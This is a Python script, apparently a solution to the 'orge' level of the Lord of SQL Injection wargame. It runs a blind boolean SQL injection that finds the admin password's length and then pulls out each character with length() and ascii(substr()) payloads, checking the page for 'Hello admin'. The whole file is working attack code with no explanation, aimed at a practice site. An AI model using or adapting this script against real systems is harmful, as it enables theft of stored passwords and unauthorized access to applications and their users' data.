import requests

cookies={'PHPSESSID':'b61p6jj4h0n0rthn6uq0jjvdmr'}

for length in range(1,30):
    address="https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
    url=address+"?pw= '|| length(pw)="+str(length)+"%23"
    res=requests.get(url,cookies=cookies)

    if "Hello admin" in res.text:
        print("비밀번호 길이는??:"+str(length))
        break
    else:
        print(str(length)+"자리 아님")

i=length
pw=""
for a in range(1,i+1):
    for b in range(48,123):
        url= address+"?pw='|| id ='admin' %26%26 ascii(substr(pw,"+str(a)+",1))="+str(b)+"%23"
        res=requests.get(url,cookies=cookies)

        if"<h2>Hello admin</h2>" in res.text:
            print(str(a)+"of pw----------->"+str(chr(b)))
            pw=pw+chr(b)
            break
print(pw)
